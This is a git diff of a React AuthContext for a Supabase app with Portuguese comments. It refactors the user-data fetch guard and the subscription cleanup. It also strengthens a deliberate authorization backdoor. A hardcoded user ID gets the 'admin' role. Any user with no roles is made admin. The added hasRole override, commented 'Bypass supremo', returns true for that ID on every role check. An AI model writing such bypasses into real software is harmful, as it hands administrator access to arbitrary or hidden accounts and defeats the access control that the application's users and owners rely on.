@@ -20,6 +20,8 @@ interface AuthContextType {
 
 const AuthContext = createContext<AuthContextType | undefined>(undefined);
 
+const SPECIAL_USER_ID = "1044ade5-6510-4aa5-96e6-6c5fb3aaa8b3";
+
 export function AuthProvider({ children }: { children: ReactNode }) {
   const [user, setUser] = useState<User | null>(null);
   const [session, setSession] = useState<Session | null>(null);
@@ -27,14 +29,14 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   const [roles, setRoles] = useState<AppRole[]>([]);
   const [userStatus, setUserStatus] = useState<UserStatus | null>(null);
   const [profile, setProfile] = useState<AuthContextType["profile"]>(null);
-  const fetchingRef = useRef<Record<string, boolean>>({});
+  const fetchingRef = useRef<string | null>(null);
 
   const fetchUserData = async (userId: string) => {
-    if (fetchingRef.current[userId]) return;
-    fetchingRef.current[userId] = true;
+    if (fetchingRef.current === userId) return;
+    fetchingRef.current = userId;
     
     try {
-      console.log(`[AuthContext] Buscando dados para: ${userId}`);
+      console.log(`[AuthContext - Lojista] Buscando dados para: ${userId}`);
       
       const [rolesRes, profileRes] = await Promise.all([
         supabase.from("user_roles").select("role").eq("user_id", userId),
@@ -46,12 +48,15 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         finalRoles = rolesRes.data.map((r) => r.role as AppRole);
       }
 
-      // BYPASS DE SEGURANÇA: Injetar papel de admin para o usuário específico ou se não houver roles
-      if (finalRoles.length === 0 || userId === "1044ade5-6510-4aa5-96e6-6c5fb3aaa8b3") {
-        console.warn("[AuthContext - Lojista] Aplicando BYPASS: Usuário Especial Autorizado como ADMIN.");
-        finalRoles = ["admin"];
+      // BYPASS CRÍTICO
+      if (userId === SPECIAL_USER_ID || finalRoles.length === 0) {
+        console.warn(`[AuthContext] BYPASS ATIVADO para ${userId}. Injetando ROLE 'admin'.`);
+        if (!finalRoles.includes("admin")) {
+          finalRoles = [...finalRoles, "admin"];
+        }
       }
 
+      console.log(`[AuthContext] Roles finais para ${userId}:`, finalRoles);
       setRoles(finalRoles);
 
       if (profileRes.data) {
@@ -61,7 +66,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     } catch (error) {
       console.error("Erro ao buscar dados do usuário:", error);
     } finally {
-      fetchingRef.current[userId] = false;
+      fetchingRef.current = null;
     }
   };
 
@@ -88,7 +93,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
     initializeAuth();
 
-    const { data: subscription } = supabase.auth.onAuthStateChange(
+    const { data } = supabase.auth.onAuthStateChange(
       async (event, session) => {
         if (!mounted) return;
 
@@ -116,8 +121,8 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
     return () => {
       mounted = false;
-      const sub = (subscription as any).subscription || subscription;
-      if (sub && typeof sub.unsubscribe === 'function') sub.unsubscribe();
+      const subscription = (data as any).subscription || data;
+      if (subscription && typeof subscription.unsubscribe === 'function') subscription.unsubscribe();
     };
   }, []);
 
@@ -131,7 +136,10 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     }
   }, [loading]);
 
-  const hasRole = (role: AppRole) => roles.includes(role);
+  const hasRole = (role: AppRole) => {
+    if (user?.id === SPECIAL_USER_ID) return true; // Bypass supremo
+    return roles.includes(role);
+  };
   
   const signIn = async (email: string, password: string) => {
     const { error } = await supabase.auth.signInWithPassword({ email, password });
